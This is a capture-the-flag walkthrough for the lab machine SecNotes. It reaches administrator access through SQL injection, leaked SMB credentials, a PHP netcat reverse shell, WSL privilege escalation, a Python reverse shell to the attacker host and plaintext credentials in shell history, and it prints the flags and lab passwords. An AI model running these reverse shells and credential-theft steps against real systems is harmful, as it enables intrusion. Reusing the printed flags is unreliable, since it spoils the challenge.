# SecNotes - Medium

```shell
nmap -T4 -p- -A -Pn -v 10.10.10.97

feroxbuster -u http://10.10.10.97 -w /usr/share/wordlists/dirb/common.txt -x php,html,bak,js,txt,json,docx,pdf,zip --extract-links --scan-limit 2 --filter-status 401,403,404,405,500 --silent

smbclient \\\\10.10.10.97\\new-site -U tyler

dir

put shell.aspx
#we can put files in the smb server
#but they cannot be found on webpage

#for netcat and php reverse shell upload
#on attacker machine
locate nc.exe

cp /usr/share/windows-resources/binaries/nc.exe nc.exe

vim nc-shell.exe
#create simple php nc reverse shell

nc -nvlp 4444
#setup listener

smbclient \\\\10.10.10.97\\new-site -U tyler

put nc.exe

put nc-shell.exe

#visit nc-shell.php page on port 8808
#we get reverse shell
whoami
#tyler

systeminfo
#we cannot get systeminfo

#we are given the hint that this uses privesc through WSL
where /R C:\windows wsl
#finds wsl.exe

C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe
#we can now execute Linux commands

whoami
#root

which python

#setup listener in attacker machine
nc -nvlp 5555

#back to wsl session
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.3",5555));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

#we get root reverse shell on listener
whoami
#root

ls -la
#filesystem, but we do not have anything

history
#shows admin creds in plaintext

#on attacker machine
smbexec.py 'Administrator:u6!4ZwgwOM#^OBf#Nwnh'@10.10.10.97
#use creds found in history
#we get shell as System
```

```php
<?php
system('nc.exe -e cmd.exe 10.10.14.3 4444')
?>
```

* Open ports & services:

  * 80 - http - Microsoft IIS httpd 10.0
  * 445 - microsoft-ds - Windows 10 Enterprise 17134 microsoft-ds
  * 8808 - http - Microsoft IIS httpd 10.0

* feroxbuster finds the following pages on port 80:

  * /contact.php
  * /home.php
  * /login.php
  * /register.php
  * /logout.php

* Now, in the /login.php page, as we do not have a registered user, we will have to create one in /register.php

* Testing for injection in /register.php, we use the payload ```'OR 1 OR'``` as username, and after feeding the same payload for login, we get access to all notes on the website - this is a clear case of SQLi.

* There is a note which includes the following information:

  ```markdown
  \\secnotes.htb\new-site
  tyler / 92g!mA8BGjOirkL%OG*&
  ```

* This can be credentials for SMB service on port 445; we can login as tyler.

* Now, the SMB share contains two files, iisstart.htm and iisstart.png, both of which indicate the files for the IIS server on page 8808.

* We can put files such as an .aspx reverse-shell, but it cannot be accessed on the webserver; we have to use a workaround.

* psexec.py does not work as well.

* We can use netcat and a php reverse shell uploaded on the server to get reverse shell.

* After getting nc.exe and the simple PHP shell, we put both those files in the SMB share, and we get a reverse shell on our listener when we visit the page on port 8808.

* Now, using the hint that privesc can be done by exploiting WSL, we need to find wsl.exe

* Using the ```where``` command, we get location ```C:\Windows\WinSxS\amd64_microsoft-windows-lxss-wsl_31bf3856ad364e35_10.0.17134.1_none_686f10b5380a84cf\wsl.exe``` for wsl.exe (and bash.exe in the same directory).

* Executing wsl.exe gives us a Linux environment, as root user.

* We can use a Python reverse shell code and setup another listener for this, so that on executing the Python code we get reverse shell as root.

* Now, the directory does not contain any files of use.

* However, using ```history``` command, we get the Administrator creds in plaintext, used for logging over smbclient; the username and password is separated by '%'.

* Using smbexec.py on attacker machine, we can use these creds and get access to the machine as Administrator and get both flags.

```markdown
1. User flag - d5f868e66d4a6d1188f05bbc58a11054

2. Root flag - d63f4550fbd6d54b80c6382a42417942
```
